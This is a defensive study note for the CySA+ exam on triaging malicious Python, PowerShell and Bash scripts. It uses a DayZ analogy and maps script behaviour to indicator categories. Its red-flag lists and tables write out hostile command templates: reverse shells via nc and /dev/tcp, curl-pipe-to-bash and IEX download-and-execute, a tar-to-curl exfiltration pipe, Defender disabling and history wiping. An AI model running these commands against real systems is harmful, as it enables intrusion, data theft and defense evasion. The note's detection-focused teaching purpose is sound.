# Scripting Basics

## What it is

In **DayZ**, the difference between living and dying on a high-pop Chernarus server is reading the environment fast. You hear a single suppressed shot two ridges over. Was that a fresh spawn killing a chicken with a Mosin, a survivor clearing a zombie with a CR-75, or a geared player sighting in on you? You can't see the shooter. You only see the artifact — the sound, the bird flush, the zombie aggro pulling north. You build the picture from fragments. Now imagine those fragments are a 400-line PowerShell one-liner full of `-EncodedCommand` and base64, sitting in your EDR alert queue at 2:47am. Same job. Read the artifact, build the picture, decide if you push or extract.

In plain English: scripting basics for a CySA+ analyst means you can look at a Python, PowerShell, or Bash script — one your EDR flagged, one pulled from a phishing attachment, one running as a scheduled task nobody created — and read enough to say *what it does, what it touches, and whether to escalate.* You are not writing the script. You are triaging it.

Technically: CS0-003 expects analyst-level fluency in the three languages SOCs actually see on the wire and on disk — **Python**, **PowerShell**, **Bash** — enough to recognize obfuscation, identify malicious capability (network calls, file writes, registry edits, persistence, exfil), and correlate script behavior to the indicators in Objective 1.2.

## Why it matters

Attackers script. They script because compiled malware gets caught by static signatures, but a freshly-written PowerShell loader is unique enough to dodge AV and short enough to fit in a phishing macro. **Living-off-the-land** (LOLBin) tradecraft is built on scripting — `powershell.exe`, `wscript.exe`, `bash`, `python.exe` are all signed, trusted, and present. The attacker doesn't bring a binary. They bring a script.

For the exam (Objective 1.2), CompTIA wants you to map script behavior to the IoC categories: network-related (beaconing, unexpected outbound, irregular peer-to-peer), host-related (abnormal OS process behavior, unauthorized scheduled tasks, registry changes), application-related (anomalous activity, unexpected output), and the user/data layer (introduction of new accounts, unauthorized privileges, data exfiltration). The script *is* the IoC. You need to read it.

For the job: if you can't read a malicious script, you are forwarding every PowerShell alert to L2 and your queue stays full. The L1s who read scripts close tickets. The L1s who don't, get reassigned to access reviews.

## Key facts

### The three languages, and where they show up

| Language | Where you'll see it | Why attackers love it |
|---|---|---|
| **Python** | Red team tooling, CTI scripts, custom exfil, cross-platform malware | Cross-platform, huge stdlib, easy network sockets, available on most Linux by default |
| **[[PowerShell]]** | Windows post-exploitation, Empire/Covenant payloads, fileless attacks, scheduled tasks | Signed, trusted, native to Windows, full .NET access, can run in memory |
| **Bash** | Linux/macOS persistence, container escapes, cron-based C2, web shell follow-ons | Default shell on every Linux box, every cron job, every SSH session |

### Python — what to recognize

Python is **interpreted** — no compile step, the `.py` file or a packed `.pyc` runs through `python.exe` or `/usr/bin/python3`. **Indentation is syntactically significant.** A four-space block is a code block. Get this wrong and the script doesn't run; get this right when reading and you can follow control flow without the curly braces C gave you.

Red flags in a Python script during triage:
- `import socket`, `import requests`, `urllib` — network capability
- `import subprocess`, `os.system()`, `os.popen()` — shell execution
- `import base64`, `codecs.decode(..., 'rot_13')` — obfuscation
- `exec()`, `eval()`, `compile()` — runtime code execution from a string
- `import ctypes`, `WinDLL`, `VirtualAlloc` — Windows API calls from Python, classic shellcode injection
- Hardcoded IPs, base64 blobs longer than 100 chars, `.encode()` chains

### PowerShell — what to recognize

PowerShell is the Windows attacker's first love. Object-oriented, pipeline-based, fully integrated with Windows Management Instrumentation ([[WMI]]) and .NET. Cmdlets follow `Verb-Noun` naming: `Get-Process`, `Invoke-WebRequest`, `New-ScheduledTask`.

**Execution policies** — CompTIA tests these. They are *not* a security boundary. They are a guardrail against accidental execution. An attacker bypasses them in one flag.

| Policy | Behavior |
|---|---|
| **Restricted** | Default on Windows clients. No scripts run. Interactive only. |
| **AllSigned** | Only scripts signed by a trusted publisher run. |
| **RemoteSigned** | Local scripts run unsigned; scripts downloaded from the internet must be signed. **Recommended baseline.** |
| **Unrestricted** | All scripts run, warning prompt on downloaded scripts. |
| **Bypass** | Nothing blocked, no prompts. Attacker's favorite via `-ExecutionPolicy Bypass`. |

Red flags in PowerShell:
- `-EncodedCommand` / `-enc` — base64-encoded payload, decoded and executed in memory
- `-WindowStyle Hidden`, `-NoProfile`, `-NonInteractive` — running invisibly
- `IEX` / `Invoke-Expression` paired with `(New-Object Net.WebClient).DownloadString(...)` — the classic download-and-execute, fileless
- `Invoke-WebRequest` / `iwr` / `curl` (alias) to an unknown host
- `New-ScheduledTask`, `Register-ScheduledTask` — persistence
- `Add-MpPreference -ExclusionPath` — Defender exclusion, attacker carving out safe territory
- `Set-MpPreference -DisableRealtimeMonitoring $true` — turning Defender off
- `[System.Reflection.Assembly]::Load(...)` — reflective .NET loading, in-memory
- `Get-WmiObject`, `Invoke-WmiMethod` — WMI for lateral movement and recon

### Bash — what to recognize

Bash is the Linux/macOS equivalent. Persistence lives in `.bashrc`, `.profile`, `crontab`, `/etc/systemd/system/`, and `~/.ssh/authorized_keys`.

Red flags in Bash:
- `curl http://... | bash` or `wget -O- ... | sh` — download and pipe to shell, no file on disk to scan
- `chmod +x` followed by execution of a binary from `/tmp`, `/dev/shm`, or `/var/tmp`
- `nohup ... &` to background a process across the user's logout
- `nc -e /bin/sh <ip> <port>` or `bash -i >& /dev/tcp/<ip>/<port> 0>&1` — reverse shells
- Modifications to `crontab -e`, `/etc/cron.d/`, `/etc/cron.daily/` — scheduled persistence
- New entries in `~/.ssh/authorized_keys` — account persistence
- `history -c` followed by `unset HISTFILE` — covering tracks
- `base64 -d`, `xxd -r`, `openssl enc -d` chained into `bash` — obfuscation

### Mapping scripts to Objective 1.2 indicators

| Script behavior | IoC category |
|---|---|
| `Invoke-WebRequest` to a non-corporate IP every 60s with jitter | **Beaconing**, unexpected outbound |
| `nc -e /bin/sh` to an external host | **Malicious process**, unauthorized changes to communication |
| `tar czf - /home \| curl -T - http://...` | **Data exfiltration**, bandwidth consumption |
| `for i in $(seq 1 254); do ping -c1 10.0.0.$i; done` | **Scans/sweeps**, irregular peer-to-peer |
| `New-LocalUser`, `useradd`, `net user /add` | **Introduction of new accounts**, unauthorized privileges |
| `New-ScheduledTask`, `crontab` edits | **Unauthorized scheduled tasks**, abnormal OS process behavior |
| `reg add HKLM\Software\...\Run` | **Registry changes**, persistence |
| `Add-MpPreference -ExclusionPath` | **Unauthorized changes**, service interruption (defensive tooling) |
| Sudden 4GB write to `C:\Users\Public\` | **Drive capacity consumption**, file system changes |
| Python script holding 90% CPU running a crypto miner | **Processor consumption**, **memory consumption**, malicious process |
| Obfuscated base64 URL in an email attachment macro | **Obfuscated links**, social engineering |

### Obfuscation — the dead giveaway

Legitimate admin scripts are readable. Malicious scripts hide. If you see any of these, escalate:

- Base64 strings longer than the rest of the script combined
- Variable names like `$a1`, `$xY9`, `$_`, randomized
- Character-by-character string construction: `('I'+'E'+'X')`, `[char]73 + [char]69 + [char]88`
- Reversed strings: `"sserpxe-ekovnI"[-1..-15] -join ''`
- XOR decoding loops
- `FromBase64String` paired with `[Text.Encoding]::UTF8.GetString` and `IEX`

### CompTIA exam traps

> **CompTIA exam trap:** PowerShell **execution policy** is *not* a security control. It's a safety rail. `powershell.exe -ExecutionPolicy Bypass -File evil.ps1` bypasses Restricted in a single argument, and CompTIA will give you an answer that says "set execution policy to AllSigned to prevent attacks" — that answer is wrong. The right control is **Constrained Language Mode**, **AppLocker**/**WDAC**, and **PowerShell script block logging** (Event ID 4104).

> **CompTIA exam trap:** "Interpreted vs compiled" — Python and Bash and PowerShell are all interpreted. The exam may ask which language requires a compile step before execution. None of these three do. C, C++, Go, Rust do.

> **CompTIA exam trap:** Indentation in Python is **syntactically required**, not stylistic. A four-space indent and a tab are not equivalent. CompTIA may show a code snippet and ask why it fails — wrong indentation is the answer.

> **CompTIA exam trap:** `IEX` (Invoke-Expression) is the PowerShell red flag. If a snippet shows `IEX (New-Object Net.WebClient).DownloadString('http://...')`, the answer is **fileless malware** / **living-off-the-land**, not "phishing payload" or "ransomware" generically.

## SOC reality

- The alert at 3am: EDR fires on `powershell.exe -nop -w hidden -enc <800 chars of base64>`. Your job in 90 seconds — decode the base64 (CyberChef, `[Convert]::FromBase64String` in a sandbox), identify what it calls home to, check if that IP is in threat intel, and decide isolate-or-watch.
- The L1 first action: **acknowledge the ticket, decode the payload in a sandboxed analyst VM, never on your workstation, never on the affected host.** Pull the parent process tree from EDR — was it `winword.exe` → `powershell.exe`? That's a macro-borne loader and the user opened something they shouldn't have.
- What the IR lead asks: *"Did it beacon? Where to? How long? Did it write to disk or stay in memory? Any lateral movement from that host yet?"* Have answers ready. "I'm still decoding" is acceptable for 5 minutes, not 50.
- Never tell leadership "it didn't execute" based on the absence of a child process. Fileless PowerShell can run entirely in `powershell.exe`'s own memory space. Absence of a new process is not absence of execution. *Check script block logs (Event ID 4104) and AMSI telemetry before you make that call.*
- The handoff: L1 decodes and triages. L2 reverses the deobfuscated payload and maps to ATT&CK. IR isolates the host, pulls memory, hunts for the same payload across the fleet. Threat intel writes the IoC report and pushes hashes/IPs to the blocklist.
- 80% of PowerShell alerts in a mature SOC are sysadmins, Intune scripts, and security tooling. The 20% that aren't will end your weekend if you tune them out.

## Related concepts

[[PowerShell]] · [[Bash]] · [[Python]] · [[Living off the Land]] · [[Fileless Malware]] · [[Indicators of Compromise]] · [[Beaconing]] · [[Obfuscation]] · [[Script Block Logging]] · [[AMSI]] · [[Scheduled Tasks]] · [[Persistence Mechanisms]] · [[MITRE ATT&CK]] · [[EDR]] · [[Sandboxing]] · [[CyberChef]]

*Source: VIRGIL knowledge base — 2026-05-11*